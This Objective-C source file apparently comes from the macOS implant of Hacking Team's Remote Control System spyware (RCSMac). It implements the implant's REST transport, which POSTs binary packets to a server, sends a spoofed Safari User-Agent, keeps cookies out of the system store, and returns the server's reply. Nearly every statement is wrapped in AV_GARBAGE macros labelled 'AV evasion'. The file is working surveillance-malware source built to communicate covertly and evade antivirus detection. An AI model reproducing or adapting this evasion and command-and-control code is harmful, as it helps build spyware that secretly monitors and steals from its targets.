/*
 * RCSMac - RESTTransport
 *  Transport implementation for REST Protocol.
 *
 *
 * Created by revenge on 13/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "RESTTransport.h"
#import "RCSMCommon.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

#define USER_AGENT @"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-us) AppleWebKit/534.16+ (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4"


@implementation RESTTransport

- (id)initWithURL: (NSURL *)aURL
           onPort: (int32_t)aPort
{
  if (self = [super init])
    {
      // AV evasion: only on release build
      AV_GARBAGE_002
      
    
      if (aURL == nil)
        {
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          
          [self release];
          return nil;
        }
      
      if (aPort <= 0)
        {  
          // AV evasion: only on release build
          AV_GARBAGE_003        
          
          [self release];
          return nil;
        }
    
      mURL    = [aURL copy];
      mCookie = nil;
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      return self;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  return nil;
}

- (void)dealloc
{
  [mURL release];
  [mCookie release];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [super dealloc];
}

// Abstract Class Methods
//- (BOOL)connect;
//{
//#ifdef DEBUG_TRANSPORT
  //infoLog(@"URL: %@", mURL);
//#endif
  
  //return YES;
//}

//- (BOOL)disconnect
//{
  //return YES;
//}
// End Of Abstract Class Methods

- (NSData *)sendData: (NSData *)aPacketData
   returningResponse: (NSURLResponse *)aResponse
{  
  // AV evasion: only on release build
  AV_GARBAGE_003  
  
  NSMutableURLRequest *urlRequest = [[NSMutableURLRequest alloc] initWithURL: mURL];
  NSData *replyData;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [urlRequest setTimeoutInterval: 10];
  [urlRequest setHTTPMethod: @"POST"];
  [urlRequest setHTTPBody: aPacketData];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  [urlRequest setValue: @"application/octet-stream"
    forHTTPHeaderField: @"Content-Type"];  
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  [urlRequest setValue: USER_AGENT
    forHTTPHeaderField: @"User-Agent"];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  //
  // Avoid to store cookies in the cookie manager
  //
  [urlRequest setHTTPShouldHandleCookies: NO];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  if (mCookie != nil)
    {  
      // AV evasion: only on release build
      AV_GARBAGE_003
    
      [urlRequest setValue: mCookie
        forHTTPHeaderField: @"Cookie"];
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  replyData = [NSURLConnection sendSynchronousRequest: urlRequest
                                    returningResponse: &aResponse
                                                error: nil];
  [urlRequest release];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  if (aResponse == nil)
    {  
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      return nil;
    }
  
  NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)aResponse;
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  NSDictionary *headerFields = [httpResponse allHeaderFields];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  // Handle cookie
  NSString *cookie = [headerFields valueForKey: @"Set-Cookie"];
  
  if (cookie != nil)
    {  
      // AV evasion: only on release build
      AV_GARBAGE_002
          
      if (mCookie != nil)
        {
          [mCookie release];
        }
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      mCookie = [cookie copy];
    }
  
  int statusCode = [httpResponse statusCode];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  
  if (statusCode == 200)
    return replyData;
  else
    return nil;
}

@end
